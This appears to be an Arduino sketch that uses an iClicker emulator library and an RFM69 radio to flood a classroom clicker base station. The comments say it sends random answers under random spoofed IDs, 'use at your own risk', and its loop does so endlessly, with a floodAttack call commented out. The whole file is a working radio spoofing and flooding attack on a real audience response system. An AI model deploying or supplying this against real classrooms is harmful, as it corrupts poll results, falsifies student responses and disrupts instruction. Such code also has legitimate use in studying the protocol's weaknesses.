#include "iClickerEmulator.h"
#include <string.h>

#define IS_RFM69HW false //make true if using w version
#define IRQ_PIN 6
#define CSN 10

iClickerEmulator clicker(CSN, IRQ_PIN, digitalPinToInterrupt(IRQ_PIN), IS_RFM69HW);


// This will flood base station with random answers under random ids
// Use at your own risk...

void setup()
{
    Serial.begin(115200);
    clicker.begin(iClickerChannels::AA); //set channel to AA
    //clicker.dumpRegisters();
}


void loop()
{

  uint8_t id[4];
  iClickerEmulator::randomId(id);
  //clicker.floodAttack(100, 10);
  iClickerAnswer_t ans = clicker.randomAnswer();
  clicker.submitAnswer( id, ans, false, 100);

  //delay(1000);
  Serial.println(".");

}
